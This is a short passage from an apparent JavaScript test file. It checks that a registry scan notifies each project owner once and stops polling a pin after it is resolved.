    ].sort();
    expect(notices()).toEqual(
      owners.map((recipient_github_id) => ({
        recipient_github_id,
        action_path: "/projects/open-registry",
      })),
    );
    // The same pin is now resolved, not polled forever or notified again.
    expect((await runScanPass(config)).assessments).toEqual([]);
    expect(notices()).toHaveLength(owners.length);
    expect(provider.calls).toEqual([]);
  });
}
